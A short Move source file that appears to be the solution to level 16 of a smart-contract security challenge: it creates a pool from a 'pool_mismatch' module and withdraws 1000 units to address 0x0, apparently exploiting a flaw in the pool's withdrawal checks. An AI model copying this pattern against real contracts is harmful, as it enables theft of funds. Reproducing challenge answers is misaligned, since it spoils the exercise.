module move_over::level_16_solution;

use move_over::pool_mismatch;

public fun run(t: &mut tx_context::TxContext): pool_mismatch::Pool {
    let mut p = pool_mismatch::create_initial(t);
    pool_mismatch::withdraw(&mut p, @0x0, 1000, t);
    p
}
